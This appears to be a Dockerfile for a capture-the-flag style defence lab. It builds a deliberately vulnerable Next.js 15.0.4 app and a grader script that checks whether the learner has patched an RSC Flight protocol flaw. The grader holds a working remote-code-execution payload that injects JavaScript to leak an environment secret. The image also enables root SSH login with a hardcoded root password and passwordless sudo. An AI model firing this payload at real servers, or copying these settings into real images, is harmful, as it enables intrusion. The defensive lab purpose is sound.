# syntax=docker/dockerfile:1
FROM ubuntu:24.04

# Set environment variables
ENV DEBIAN_FRONTEND=noninteractive
ENV TZ=Asia/Bangkok
ENV NODE_ENV=development

RUN apt-get update \
    && apt-get install -y unminimize \
    && rm -rf /var/lib/apt/lists/* \
    && yes | unminimize

RUN apt-get update && apt-get upgrade -y && \
    apt-get install -y openssh-server apt-file apt-utils iproute2 iputils-ping sudo htop iputils* acl tzdata net-tools vim nano acl curl git tini tmux

RUN curl -fsSL https://deb.nodesource.com/setup_20.x | bash - \
    && apt-get install -y nodejs

# Create user and set passwords
RUN useradd -m -s /bin/bash secspace && \
    echo 'secspace:secspace' | chpasswd && \
    usermod -aG sudo secspace && \
    usermod -U secspace && \
    echo 'root:supersecret_password' | chpasswd && \
    usermod -U root

RUN mkdir /var/run/sshd && \
    sed -i 's/^#\(PermitRootLogin \).*/\1yes/' /etc/ssh/sshd_config && \
    sed -i 's/^#\(PasswordAuthentication \).*/\1yes/' /etc/ssh/sshd_config && \
    sed -i 's/^#\(KbdInteractiveAuthentication \).*/\1yes/' /etc/ssh/sshd_config && \
    sed 's@session\s*required\s*pam_loginuid.so@session optional pam_loginuid.so@g' -i /etc/pam.d/sshd && \
    echo "export VISIBLE=now" >> /etc/profile

RUN echo 'secspace ALL=(ALL) NOPASSWD: ALL' | tee -a /etc/sudoers

WORKDIR /home/secspace

USER secspace

RUN npx create-next-app@15.0.4 app \
    --yes \
    --use-npm \
    --typescript \
    --eslint \
    --app \
    --no-tailwind \
    --no-src-dir \
    --import-alias "@/*"

WORKDIR /home/secspace/app

RUN npm install

# Store the secret in a file to avoid the Docker ENV security warning
RUN echo "cve{nextjs-flight-protocol-issue-defended}" > .rng_secret

USER root

# Switch to bash shell so heredoc works reliably
SHELL ["/bin/bash", "-c"]

# Create the submission tool inline
RUN cat > /usr/local/bin/submit <<'SCRIPT'
#!/bin/bash
# Get the secret from the protected file
SECRET=$(cat /home/secspace/app/.rng_secret 2>/dev/null)

# Payload for the Next.js RSC Flight Protocol RCE attack
PAYLOAD='{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.env.RNG_SECRET;throw Object.assign(new Error(\"x\"),{digest: res});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'

# Send the attack request
RESULT=$(curl -s -X POST "http://localhost:3000/adfa" \
  -H "Next-Action: x" \
  -F "0=$PAYLOAD" \
  -F '1="$@0"' \
  -F '2=[]')

# Check if the secret was successfully leaked in the result
if echo "$RESULT" | grep -q "$SECRET"; then
  echo -ne "\e[31mIncorrect\e[0m\n"
else
  echo -ne "\e[32mCorrect\e[0m\n"
fi
SCRIPT

RUN chmod +x /usr/local/bin/submit

# Switch back to default shell
SHELL ["/bin/sh", "-c"]

EXPOSE 22 3000

ENTRYPOINT ["/usr/bin/tini", "--"]

# Start SSH and the Next.js dev server inside a tmux session
CMD ["/bin/bash", "-c", "/usr/sbin/sshd && su - secspace -c 'tmux new-session -d -s nextjs \"export RNG_SECRET=$(cat /home/secspace/app/.rng_secret) && cd /home/secspace/app && npm run dev\"' && tail -f /dev/null"]
